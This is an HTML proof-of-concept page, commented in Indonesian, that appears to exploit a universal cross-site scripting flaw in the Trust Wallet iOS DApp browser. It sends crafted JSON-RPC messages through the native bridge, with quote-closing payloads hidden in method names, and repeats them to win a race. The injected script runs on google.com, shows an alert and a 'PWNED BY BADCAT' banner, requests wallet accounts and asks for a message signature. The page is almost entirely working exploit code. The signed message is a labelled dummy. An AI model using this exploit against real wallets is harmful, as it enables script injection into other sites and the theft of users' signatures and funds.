<!doctype html>
<html lang="id">
<head>
  <meta charset="utf-8">
  <title>Trust Wallet iOS RPC error UXSS lab</title>
</head>
<body>
  <a id="run" href="https://google.com/">RUN</a>
  <pre id="status">PoC lab</pre>

  <script>
    'use strict';

    const runLink = document.querySelector('#run');
    const status = document.querySelector('#status');
    const target = 'https://google.com/';
    const dummyMessage =
      'Trust Wallet UXSS lab test only. No authorization or asset transfer.';
    const dummyMessageHex = '0x' + Array.from(
      new TextEncoder().encode(dummyMessage),
      byte => byte.toString(16).padStart(2, '0')
    ).join('');

    const impactStatements = [
      '(async () => {',
      String.raw`if (!/(^|\.)google\.com$/.test(location.hostname)) return;`,
      'if (window.__twUxssLab) return;',
      'const provider = window.ethereum;',
      "if (!provider || typeof provider.request !== 'function') return;",
      'window.__twUxssLab = true;',
      "document.body?.insertAdjacentHTML('afterbegin', '<h1 id=tw-uxss-lab>PWNED BY BADCAT</h1>');alert(document.domain);",
      'let accounts;',
      "try { accounts = await provider.request({method: 'eth_requestAccounts'}); }",
      "catch (error) { console.log('UXSS lab: connect ditolak', String(error)); return; }",
      'if (!accounts?.[0]) return;',
      `try { await provider.request({method: 'personal_sign', params: [${JSON.stringify(dummyMessageHex)}, accounts[0]]}); }`,
      "catch (error) { console.log('UXSS lab: sign dummy ditolak', String(error)); }",
      '})();'
    ];

    // --- MODIFIKASI: daftar kombinasi, diuji SATU per RUN ---
    const payload = impactStatements.join(' ');
    const closers = ['");', "');", '`);', '\\";', '\\u0022);'];
    const handlers = ['rpcCall', 'signMessage', 'signPersonalMessage',
                      'signTransaction', 'requestAccounts'];
    const combos = [];
    for (const name of handlers)
      for (const c of closers)
        combos.push({ name, closer: c, marker: `zz_${c}${payload}//` });

    // indeks tersimpan supaya tiap RUN maju ke kombinasi berikutnya
    let idx = 0;
    try { idx = parseInt(localStorage.getItem('tw_combo_idx') || '0', 10) || 0; } catch (e) {}
    if (idx >= combos.length) idx = 0;
    const cur = combos[idx];
    status.textContent =
      `Siap uji #${idx + 1}/${combos.length}: name=${cur.name} closer=[${cur.closer}]. Tap RUN.`;
    // -------------------------------------------------------

    runLink.addEventListener('click', event => {
      event.preventDefault();

      const bridge = window.webkit?.messageHandlers?._tw_;
      if (!bridge || typeof bridge.postMessage !== 'function' ||
          !window.trustwallet?.ethereum) {
        status.textContent =
          'Buka halaman ini pada DApp browser Trust Wallet iOS 26.38.10.';
        return;
      }

      const baseId = Math.trunc(Date.now() % 9000000000000000);
      let sent = 0;

      // Hanya SATU kombinasi (cur), tetap 8x seperti PoC asli untuk memenangkan race.
      for (let i = 0; i < 8; i++) {
        try {
          bridge.postMessage({
            id: baseId + i,
            network: 'ethereum',
            name: cur.name,
            object: {
              method: cur.marker,
              params: [],
              jsonrpc: '2.0'
            }
          });
          sent++;
        } catch (error) {
          status.textContent =
            `Bridge menolak request ke-${i + 1}: ${String(error)}`;
          break;
        }
      }

      // majukan indeks untuk RUN berikutnya
      try { localStorage.setItem('tw_combo_idx', String((idx + 1) % combos.length)); } catch (e) {}

      status.textContent =
        `#${idx + 1} (${cur.name} / ${cur.closer}): ${sent} req dikirim; navigasi ke ${target}`;
      setTimeout(() => location.assign(target), 120);
    }, {once: true});
  </script>
</body>
</html>
